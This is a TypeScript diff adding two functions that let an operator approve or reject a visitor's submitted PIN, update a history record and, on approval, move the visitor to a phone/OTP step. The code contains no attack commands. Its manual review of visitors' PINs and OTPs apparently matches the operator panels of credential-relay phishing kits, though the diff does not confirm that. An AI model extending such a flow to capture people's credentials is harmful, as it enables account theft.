@@ -175,3 +175,38 @@ export async function handlePhoneOtpResend(visitorId: string): Promise<void> {
     phoneOtpStatus: "show_phone_otp" as any
   })
 }
+
+/**
+ * Handle PIN approval
+ */
+export async function handlePinApproval(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "approved", history)
+  
+  // Approve PIN and redirect to phone page
+  await updateApplication(visitorId, {
+    _v6Status: "approved",
+    currentStep: "phone" as any
+  })
+}
+
+/**
+ * Handle PIN rejection
+ */
+export async function handlePinRejection(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "rejected", history)
+  
+  // Reject PIN and notify visitor
+  await updateApplication(visitorId, {
+    _v6Status: "rejected"
+  })
+}
